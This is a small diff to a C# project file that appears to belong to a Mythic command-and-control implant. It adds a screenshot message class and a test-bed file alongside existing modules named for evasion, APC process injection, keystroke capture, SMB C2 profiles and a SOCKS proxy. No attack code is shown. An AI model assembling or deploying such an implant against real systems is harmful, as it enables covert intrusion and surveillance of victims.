@@ -137,6 +137,7 @@
     <Compile Include="CommandModules\Spawn.cs" />
     <Compile Include="Evasion\EvasionManager.cs" />
     <Compile Include="Injection\QueueUserAPCInjection.cs" />
+    <Compile Include="IPC\ScrenshotMessage.cs" />
     <Compile Include="IPC\KeystrokeMessage.cs" />
     <Compile Include="Mythic.cs" />
     <Compile Include="C2Profiles\SMBClientProfile.cs" />
@@ -151,6 +152,7 @@
     <Compile Include="Native\Enums.cs" />
     <Compile Include="Native\Helpers.cs" />
     <Compile Include="Native\ManagedClasses.cs" />
+    <Compile Include="ReznokTestBed.cs" />
     <Compile Include="SacrificialProcesses\SacrificialProcess.cs" />
     <Compile Include="CommandModules\InjectionManager.cs" />
     <Compile Include="SocksProxy\Classes\ProxyConnection.cs" />
